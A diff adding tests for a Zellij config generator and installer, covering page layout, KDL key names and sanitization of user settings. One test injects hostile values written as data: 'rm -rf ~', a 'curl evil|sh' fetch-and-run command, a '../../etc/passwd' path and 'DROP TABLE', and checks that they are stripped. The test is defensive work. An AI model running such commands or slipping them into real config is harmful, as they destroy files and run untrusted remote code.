@@ -1004,6 +1004,62 @@ function bashCheck(src, label) {
   ok(!/\$\{XDG_CONFIG_HOME/.test(HD.herdrApplyBlock(evilHd)),
     'herdr: the installer targets the documented config path');
 
+  // ── /zellij ───────────────────────────────────────────────────────────────
+  const zjPage = (await call('/zellij')).body;
+  const ZJ = require(path.join(ROOT, 'api/_zellij.js'));
+  ok(zjPage.includes('id="compare"'), '/zellij: has the comparison block');
+  ok(zjPage.indexOf('id="pair"') < zjPage.indexOf('id="compare"'),
+    '/zellij: the comparison sits below the preview');
+  ok(zjPage.includes('id="dockgrip"') && zjPage.includes('id="pinbtn"'),
+    '/zellij: the preview pins and resizes like the others');
+  for (const p of ZJ.ZJ_PLUGINS) ok(zjPage.includes(p.repo), '/zellij: lists plugin ' + p.repo);
+  ok(zjPage.includes('saneZj'), '/zellij: sanitizes the payload before rendering it');
+
+  const evilZj = ZJ.sanitizeZellij({
+    on: true, theme: 'nord"; rm -rf ~', defaultMode: 'DROP TABLE',
+    onForceClose: 'Detach', copyCommand: 'rm -rf ~', scrollBufferSize: -5,
+    webServerPort: 99999, defaultShell: '/bin/sh; curl evil|sh',
+    plugins: ['monocle', '../../etc/passwd'],
+  });
+  ok(evilZj.theme === ZJ.ZELLIJ_DEFAULTS.theme, 'zellij: a bogus theme falls back');
+  ok(evilZj.defaultMode === 'normal', 'zellij: a bogus mode falls back');
+  // This enum is case-sensitive in Zellij, so "Detach" is a hard startup error.
+  ok(evilZj.onForceClose === 'detach', 'zellij: on_force_close is forced lowercase');
+  ok(evilZj.copyCommand === 'pbcopy', 'zellij: copy_command comes from a fixed list');
+  ok(evilZj.webServerPort <= 65535, 'zellij: the port is clamped');
+  ok(evilZj.plugins.length === 1, 'zellij: only allowlisted plugin ids survive');
+  const evilKdl = ZJ.buildZellijKdl(evilZj);
+  ok(!/rm -rf|curl |evil/.test(evilKdl), 'zellij: none of that reaches the KDL');
+  bashCheck('#!/bin/bash\nset -euo pipefail\n' + ZJ.zellijApplyBlock(evilZj), 'zellij_apply_hostile');
+  // Zellij ignores $XDG_CONFIG_HOME entirely; writing there would miss the file it reads.
+  // Asserted positively — the comment above that line in the installer explains the
+  // choice and names the variable, so a "does not contain" check would match the prose.
+  ok(/ZJ_DIR="\$HOME\/\.config\/zellij"/.test(ZJ.zellijApplyBlock(evilZj)),
+    'zellij: the installer targets ~/.config/zellij');
+  // The docs' spelling of this key is silently ignored by the binary.
+  ok(/serialize_pane_viewport/.test(evilKdl) && !/pane_viewport_serialization/.test(evilKdl),
+    'zellij: uses the key name the binary actually reads');
+  // rounded_corners only works nested under ui { pane_frames { … } }.
+  ok(/ui \{[\s\S]*pane_frames \{[\s\S]*rounded_corners/.test(evilKdl),
+    'zellij: rounded_corners is nested where it takes effect');
+
+  // If a real zellij is on PATH, let it be the judge — it is the only thing that can be,
+  // since Zellij accepts unknown option keys without complaining.
+  const zjBin = cp.spawnSync('zellij', ['--version'], { encoding: 'utf8' });
+  if (zjBin.status === 0) {
+    const dir = fs.mkdtempSync(path.join(TMP, 'zj-'));
+    fs.mkdirSync(path.join(dir, 'layouts'));
+    const full = ZJ.sanitizeZellij({ on: true, agentLayout: true, plugins: ZJ.ZJ_PLUGINS.map(p => p.id) });
+    fs.writeFileSync(path.join(dir, 'config.kdl'), ZJ.buildZellijKdl(full));
+    fs.writeFileSync(path.join(dir, 'layouts', 'ai-agent.kdl'), ZJ.buildAgentLayout(full));
+    const chk = cp.spawnSync('zellij', ['--config-dir', dir, 'setup', '--check'], { encoding: 'utf8' });
+    const out = (chk.stdout || '') + (chk.stderr || '');
+    ok(!/error|invalid|unsupported|not found/i.test(out),
+      'zellij: the generated config passes the real binary', out.slice(0, 200));
+  } else {
+    console.log('  – zellij not on PATH, skipping the real-binary check');
+  }
+
   // Naming a saved setup must not go through prompt(): the browser counts every second
   // that a modal is open as time the click handler blocked the main thread, so naming one
   // at human speed reported a ~6s interaction and Chrome flagged the page for it.
